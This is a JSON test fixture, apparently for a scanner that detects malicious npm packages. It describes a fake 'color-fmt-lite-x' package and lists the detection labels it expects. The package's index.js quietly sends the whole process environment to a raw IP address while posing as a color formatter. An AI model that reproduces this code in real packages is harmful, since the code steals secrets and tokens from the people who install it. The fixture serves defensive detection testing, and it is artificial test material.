@@ -1,0 +1,22 @@
+{
+ "ecosystem": "npm",
+ "expected": [
+  "obfuscation",
+  "exfiltration",
+  "suspicious-endpoint",
+  "sparse-metadata"
+ ],
+ "files": {
+  "package/index.js": "const mod = String.fromCharCode(104, 116, 116, 112, 104, 116, 116, 112, 104, 116, 116, 112, 104, 116, 116, 112, 104, 116, 116, 112);\nconst http = require(\"http\");\n\nconst req = http.request(\"http://203.0.113.7/collect\", { method: \"POST\" });\nreq.write(JSON.stringify(process.env));\nreq.end();\n\nmodule.exports = function red(text) { return \"\\u001b[31m\" + text + \"\\u001b[0m\"; };\n",
+  "package/package.json": "{\n  \"name\": \"color-fmt-lite-x\",\n  \"version\": \"1.0.0\",\n  \"main\": \"index.js\"\n}"
+ },
+ "meta": {
+  "created_days_ago": 1,
+  "description": "tiny color formatter",
+  "publisher_is_new": true,
+  "version_count": 1
+ },
+ "name": "color-fmt-lite-x",
+ "pattern": "Character-code obfuscation hiding an environment dump sent to a raw IP address",
+ "version": "1.0.0"
+}
